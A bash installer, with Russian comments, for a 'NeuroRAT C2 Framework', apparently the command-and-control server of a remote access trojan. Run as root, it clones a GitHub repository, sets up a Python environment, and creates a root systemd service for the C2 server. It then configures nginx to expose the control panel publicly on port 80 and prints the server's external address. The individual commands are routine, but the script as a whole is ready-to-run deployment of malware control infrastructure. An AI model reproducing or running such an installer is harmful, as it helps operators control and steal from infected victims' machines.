#!/bin/bash

# Цвета для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}====== Установка NeuroRAT C2 Framework ======${NC}"

# Проверка прав root
if [ "$(id -u)" != "0" ]; then
    echo -e "${RED}Этот скрипт должен быть запущен с правами root${NC}"
    exit 1
fi

# Создаем директорию установки
INSTALL_DIR="/opt/neurorat"
mkdir -p $INSTALL_DIR

# Проверка и установка системных зависимостей
echo -e "${YELLOW}Установка системных зависимостей...${NC}"
apt update
apt install -y python3 python3-pip python3-venv git unzip wget curl nginx

# Клонирование репозитория (если запускаем не из него)
if [ ! -f "server_api.py" ]; then
    echo -e "${YELLOW}Клонирование репозитория...${NC}"
    git clone https://github.com/Personaz1/AgentX .
fi

# Копируем файлы в директорию установки
echo -e "${YELLOW}Копирование файлов...${NC}"
cp -r ./* $INSTALL_DIR/

# Создаем виртуальное окружение и устанавливаем зависимости
echo -e "${YELLOW}Настройка Python-окружения...${NC}"
cd $INSTALL_DIR
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt

# Определение внешнего IP сервера
SERVER_IP=$(curl -s https://ipinfo.io/ip)
echo -e "${GREEN}Обнаружен внешний IP сервера: ${SERVER_IP}${NC}"

# Создаем директории для хранения данных
mkdir -p $INSTALL_DIR/uploads
mkdir -p $INSTALL_DIR/static
mkdir -p $INSTALL_DIR/templates
mkdir -p $INSTALL_DIR/builds
mkdir -p $INSTALL_DIR/logs

# Определяем порт из кода приложения
PORT=$(grep -r "DEFAULT_PORT" --include="*.py" $INSTALL_DIR | grep -o "[0-9]\+" | head -1)

if [ -z "$PORT" ]; then
    # Если порт не найден, используем 8088 по умолчанию
    PORT=8088
    echo -e "${YELLOW}Порт не найден в конфигурации, используем порт по умолчанию: $PORT${NC}"
else
    echo -e "${GREEN}Обнаружен порт в конфигурации: $PORT${NC}"
fi

# Создаем systemd сервис
echo -e "${YELLOW}Создание systemd сервиса...${NC}"
cat > /etc/systemd/system/neurorat.service << EOL
[Unit]
Description=NeuroRAT C2 Server
After=network.target

[Service]
User=root
WorkingDirectory=${INSTALL_DIR}
ExecStart=${INSTALL_DIR}/venv/bin/python3 ${INSTALL_DIR}/server_api.py
Restart=always
RestartSec=10
Environment="PATH=${INSTALL_DIR}/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

[Install]
WantedBy=multi-user.target
EOL

# Настройка Nginx для проксирования
echo -e "${YELLOW}Настройка Nginx...${NC}"
cat > /etc/nginx/sites-available/neurorat << EOF
server {
    listen 80;
    server_name _;
    
    location / {
        proxy_pass http://127.0.0.1:$PORT;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}
EOF

# Создаем символическую ссылку для активации конфигурации Nginx
ln -sf /etc/nginx/sites-available/neurorat /etc/nginx/sites-enabled/

# Удаляем стандартную конфигурацию Nginx
rm -f /etc/nginx/sites-enabled/default

# Проверяем конфигурацию Nginx
nginx -t

# Перезапускаем Nginx
systemctl restart nginx

# Активируем и запускаем сервис NeuroRAT
echo -e "${YELLOW}Запуск сервисов...${NC}"
systemctl daemon-reload
systemctl enable neurorat.service
systemctl start neurorat.service

# Проверка статуса сервисов
echo -e "${YELLOW}Проверка статуса сервисов...${NC}"
systemctl status neurorat.service --no-pager
systemctl status nginx --no-pager

echo -e "${GREEN}====== Установка NeuroRAT C2 Framework завершена! ======${NC}"
echo -e "${GREEN}Сервер доступен по адресу:${NC} http://${SERVER_IP}/"
echo -e "${YELLOW}Для просмотра логов сервера:${NC} journalctl -u neurorat.service -f"
echo -e "${YELLOW}Для просмотра логов Nginx:${NC} journalctl -u nginx -f" 